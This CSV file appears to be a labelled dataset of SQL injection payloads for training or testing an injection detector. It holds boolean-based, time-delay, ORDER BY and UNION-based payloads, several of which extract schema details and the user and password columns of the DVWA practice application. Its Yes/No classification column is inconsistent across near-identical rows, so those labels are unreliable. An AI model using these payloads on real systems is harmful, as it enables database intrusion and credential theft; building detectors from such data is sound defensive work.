input_text,Label,classification, ,,,,,,
-1163') OR 8879=3695 AND ('kTjL' LIKE 'kTjL,1,No,,,,,,,
-1070') OR 7464=7464 AND ('ULBJ' LIKE 'ULBJ,1,Yes,,,,,,,
-4600')) OR 8870=3758 AND (('orUB' LIKE 'orUB,1,No,,,,,,,
-7743')) OR 7464=7464 AND (('VUtL' LIKE 'VUtL,1,Yes,,,,,,,
-5675'))) OR 3295=3610 AND ((('aboI' LIKE 'aboI,1,No.,,,,,,,
-3939'))) OR 7464=7464 AND ((('GExr' LIKE 'GExr,1,Yes,,,,,,,
-1116%' OR 3074=8691 AND 'fceS%'='fceS,1,Yes.,,,,,,,
-9260%' OR 7464=7464 AND 'nNPS%'='nNPS,1,Yes,,,,,,,
-6376' OR 5237=8119 AND 'VHPc' LIKE 'VHPc,1,No,,,,,,,
-7316' OR 7464=7464 AND 'tKKz' LIKE 'tKKz,1,Yes,,,,,,,
-5503' OR 2561=1874 AND 'ISKs' LIKE 'ISKs,1,No,,,,,,,
-6664' iVXfDqhCzN AND 'aMhC' LIKE 'aMhC,1,No.,,,,,,,
"-2935"") OR 2342=7709 AND (""MEqL""=""MEqL",1,No,,,,,,,
"-1330"") OR 7464=7464 AND (""uiMh""=""uiMh",1,Yes,,,,,,,
"-5514"")) OR 6006=7541 AND ((""Ecsy""=""Ecsy",1,No,,,,,,,
"-9188"")) OR 7464=7464 AND ((""oHUH""=""oHUH",1,Yes,,,,,,,
"-8954""))) OR 6760=2186 AND (((""QAfI""=""QAfI",1,No.,,,,,,,
"-7170""))) OR 7464=7464 AND (((""laNS""=""laNS",1,Yes,,,,,,,
"-8085"" OR 5563=7728 AND ""pPdx""=""pPdx",1,No,,,,,,,
"-3971"" OR 7464=7464 AND ""GlEv""=""GlEv",1,Yes,,,,,,,
"-1161"") OR 9999=5791 AND (""SrbB"" LIKE ""SrbB",1,No,,,,,,,
"-8329"") OR 7464=7464 AND (""UUcj"" LIKE ""UUcj",1,Yes,,,,,,,
"-6871"")) OR 2645=2056 AND ((""aNdp"" LIKE ""aNdp",1,Yes,,,,,,,
"-2041"")) OR 7464=7464 AND ((""dFPn"" LIKE ""dFPn",1,Yes,,,,,,,
"-2420""))) OR 4131=1077 AND (((""hxEn"" LIKE ""hxEn",1,No,,,,,,,
"-6740""))) OR 7464=7464 AND (((""sjEe"" LIKE ""sjEe",1,Yes,,,,,,,
"-3265"" OR 9017=1378 AND ""HPCJ"" LIKE ""HPCJ",1,No,,,,,,,
"-4270"" OR 7464=7464 AND ""BxJG"" LIKE ""BxJG",1,Yes,,,,,,,
-6373 OR 9892=6974-- HefT,1,Yes,,,,,,,
-6920 OR 7464=7464-- mHyj,1,Yes.,,,,,,,
-1565 OR 4121=1701# PuNx,1,Yes,,,,,,,
-9423 OR 7464=7464# cPCD,1,Yes,,,,,,,
-4169' OR 4834=9319 OR 'FZUZ'='iwoP,1,No,,,,,,,
-8833' OR 7464=7464 OR 'vrbr'='zcXG,1,Yes,,,,,,,
-7781' OR 8406=9503 OR 'BdUl'='ArDy,1,No.,,,,,,,
-4080' iVXfDqhCzN OR 'ZKLp'='ArMY,1,No,,,,,,,
-9084') WHERE 7750=7750 OR 8496=7381-- cpCw,1,No.,,,,,,,
-1168') WHERE 2685=2685 OR 7464=7464-- zEVx,1,Yes.,,,,,,,
"-2090"") WHERE 6917=6917 OR 4308=4393-- GORo",1,Yes,,,,,,,
"-5898"") WHERE 4561=4561 OR 7464=7464-- QNCZ",1,Yes.,,,,,,,
-7796) WHERE 6279=6279 OR 5178=4574-- aIwW,1,Yes.,,,,,,,
-1999) WHERE 3346=3346 OR 7464=7464-- WJzG,1,Yes.,,,,,,,
-8540' WHERE 7851=7851 OR 5702=3936-- BtlQ,1,Yes.,,,,,,,
-8456' WHERE 1663=1663 OR 7464=7464-- Idcu,1,Yes,,,,,,,
"-7689"" WHERE 8105=8105 OR 1812=1183-- XcPA",1,Yes.,,,,,,,
"-8840"" WHERE 1283=1283 OR 7464=7464-- AUMR",1,Yes.,,,,,,,
-9660 WHERE 2843=2843 OR 4700=9039-- ROuM,1,No,,,,,,,
-8966 WHERE 1219=1219 OR 7464=7464-- yFrd,1,Yes.,,,,,,,
-3015')) AS xxCT WHERE 7775=7775 OR 2792=7282-- rUrg,1,Yes.,,,,,,,
-7294')) AS LTrY WHERE 2681=2681 OR 7464=7464-- Cylf,1,Yes.,,,,,,,
"-3603"")) AS hfvh WHERE 7078=7078 OR 8577=2080-- cTot",1,No.,,,,,,,
"-8267"")) AS Eolg WHERE 2114=2114 OR 7464=7464-- Rrvr",1,Yes.,,,,,,,
-7270)) AS GJoH WHERE 1192=1192 OR 6652=3962-- QJYD,1,No.,,,,,,,
-1757)) AS ybKn WHERE 2089=2089 OR 7464=7464-- uDsD,1,No.,,,,,,,
-3722') AS pFGm WHERE 2753=2753 OR 7022=7135-- WNJV,1,Yes,,,,,,,
-3370') AS INDn WHERE 5346=5346 OR 7464=7464-- GSfG,1,Yes.,,,,,,,
"-2980"") AS TIhi WHERE 8137=8137 OR 9637=8896-- nNel",1,No,,,,,,,
"-4751"") AS sgrY WHERE 5169=5169 OR 7464=7464-- dwXC",1,No.,,,,,,,
-9933) AS ZYzi WHERE 5878=5878 OR 4723=5408-- qcnh,1,No.,,,,,,,
-3049) AS hwSp WHERE 7894=7894 OR 7464=7464-- Gziu,1,Yes,,,,,,,
1) OR NOT 7169=9015-- dbHF,1,Yes.,,,,,,,
1) OR NOT 1648=1648-- jSgT,1,Yes.,,,,,,,
1') OR NOT 9002=7011-- pFMK,1,Yes.,,,,,,,
1') OR NOT 1648=1648-- BdJa,1,No.,,,,,,,
1' OR NOT 5048=4677-- ragY,1,Yes,,,,,,,
1' OR NOT 1648=1648-- hCmz,1,Yes,,,,,,,
1' OR NOT 2153=2483-- JAMX,1,Yes,,,,,,,
"(SELECT CONCAT(CONCAT(0x7176766b71,(CASE WHEN (8479=8479) THEN 0x31 ELSE 0x30 END)),0x7162786a71))",1,Yes.,,,,,,,
"1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176766b71,(SELECT (ELT(7624=7624,1))),0x7162786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- vEjo",1,Yes.,,,,,,,
"(SELECT CONCAT(0x7176766b71,(ELT(8592=8592,1)),0x7162786a71))",1,No.,,,,,,,
1';SELECT SLEEP(5)#,1,Yes.,,,,,,,
1';SELECT SLEEP(5)-- aFNV,1,Yes.,,,,,,,
1';(SELECT * FROM (SELECT(SLEEP(5)))exnX)#,1,Yes.,,,,,,,
1';(SELECT * FROM (SELECT(SLEEP(5)))iXCb)-- ajDp,1,Yes.,,,,,,,
"1';SELECT BENCHMARK(5000000,MD5(0x6a70415a))#",1,Yes.,,,,,,,
"1';SELECT BENCHMARK(5000000,MD5(0x6e53714c))-- vBIk",1,Yes,,,,,,,
1' AND (SELECT 9351 FROM (SELECT(SLEEP(5)))QcjH)-- pnNM,1,Yes,,,,,,,
1' AND (SELECT 9351 FROM (SELECT(SLEEP(0)))QcjH)-- pnNM,1,Yes.,,,,,,,
1' AND (SELECT 9351 FROM (SELECT(SLEEP(5)))QcjH)-- pnNM,1,Yes.,,,,,,,
1' ORDER BY 1-- -,1,Yes.,,,,,,,
1' ORDER BY 3233-- -,1,Yes,,,,,,,
1' ORDER BY 10-- -,1,No.,,,,,,,
1' ORDER BY 6-- -,1,Yes.,,,,,,,
1' ORDER BY 4-- -,1,Yes.,,,,,,,
1' ORDER BY 3-- -,1,Yes,,,,,,,
1' ORDER BY 2-- -,1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71) UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x586d415048766167517467786d7444597263506b6d504b74417746694a496f4b6872446d42527779,0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71) FROM (SELECT 0 AS iiyV UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS DQpt-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (4990=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4990) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x7162786a71)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,table_name)),0x7162786a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(table_name AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,column_name,column_type)),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(column_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(column_type AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x7162786a71) FROM dvwa.users-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(avatar AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(failed_login AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(first_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(last_login AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(last_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(password AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(user_id AS CHAR),0x20),0x7162786a71) FROM dvwa.users-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,column_name,column_type)),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,Yes.,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(column_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(column_type AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,`comment`,`name`,comment_id)),0x7162786a71) FROM dvwa.guestbook-- -",1,Yes,,,,,,,
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(`comment` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(`name` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(comment_id AS CHAR),0x20),0x7162786a71) FROM dvwa.guestbook-- -",1,Yes.,,,,,,,
"3'("")(,.)(.",1,No.,,,,,,,
"3'mlZrxY<'"">SGmdWr",1,No.,,,,,,,
3) AND 9170=3277-- rSTX,1,Yes.,,,,,,,
3) AND 1679=1679-- UqZw,1,Yes.,,,,,,,
3') AND 4768=1152-- ptuC,1,No.,,,,,,,
3') AND 1679=1679-- UEUc,1,Yes,,,,,,,
3' AND 4170=2773-- iUfa,1,Yes,,,,,,,
3' AND 1679=1679-- Jmnp,1,Yes.,,,,,,,
"3"" AND 2389=1482-- eLdg",1,Yes.,,,,,,,
"3"" AND 1679=1679-- grCS",1,Yes.,,,,,,,
3) AND 5661=2362 AND (9573=9573,1,No,,,,,,,
3) AND 1679=1679 AND (2545=2545,1,No.,,,,,,,
3)) AND 8697=4070 AND ((6741=6741,1,No.,,,,,,,
3)) AND 1679=1679 AND ((8077=8077,1,Yes,,,,,,,
3))) AND 3993=5061 AND (((7341=7341,1,No.,,,,,,,
3))) AND 1679=1679 AND (((7151=7151,1,Yes,,,,,,,
3 AND 4409=3181,1,No.,,,,,,,
3 AND 1679=1679,1,No.,,,,,,,
3 AND 4113=9896,1,No.,,,,,,,
3') AND 2369=9391 AND ('ClvK'='ClvK,1,Yes.,,,,,,,
3') AND 1679=1679 AND ('UhdV'='UhdV,1,No,,,,,,,
3')) AND 9479=2913 AND (('vIPS'='vIPS,1,No,,,,,,,
3')) AND 1679=1679 AND (('cwpW'='cwpW,1,No,,,,,,,
3'))) AND 7686=5210 AND ((('iOjj'='iOjj,1,No.,,,,,,,
3'))) AND 1679=1679 AND ((('ARfh'='ARfh,1,No.,,,,,,,
3' AND 2174=4072 AND 'fJxK'='fJxK,1,No,,,,,,,
3' AND 1679=1679 AND 'ilDQ'='ilDQ,1,No.,,,,,,,
3') AND 1879=4348 AND ('LCFv' LIKE 'LCFv,1,No,,,,,,,
3') AND 1679=1679 AND ('vwhE' LIKE 'vwhE,1,No,,,,,,,
3')) AND 1406=3730 AND (('zLvV' LIKE 'zLvV,1,No,,,,,,,
3')) AND 1679=1679 AND (('sZfP' LIKE 'sZfP,1,No,,,,,,,
3'))) AND 1552=8625 AND ((('NXPc' LIKE 'NXPc,1,Yes,,,,,,,
3'))) AND 1679=1679 AND ((('eUdv' LIKE 'eUdv,1,No,,,,,,,
3%' AND 6444=5833 AND 'yEUg%'='yEUg,1,No.,,,,,,,
3%' AND 1679=1679 AND 'Pczx%'='Pczx,1,No,,,,,,,
3' AND 9585=3172 AND 'MOZr' LIKE 'MOZr,1,No.,,,,,,,
3' AND 1679=1679 AND 'GZoE' LIKE 'GZoE,1,No,,,,,,,
"3"") AND 3448=9940 AND (""tPMz""=""tPMz",1,No,,,,,,,
"3"") AND 1679=1679 AND (""tnED""=""tnED",1,No.,,,,,,,
"3"")) AND 3048=1945 AND ((""eNMZ""=""eNMZ",1,No.,,,,,,,
"3"")) AND 1679=1679 AND ((""vDEU""=""vDEU",1,No,,,,,,,
"3""))) AND 2702=1806 AND (((""dLXo""=""dLXo",1,No,,,,,,,
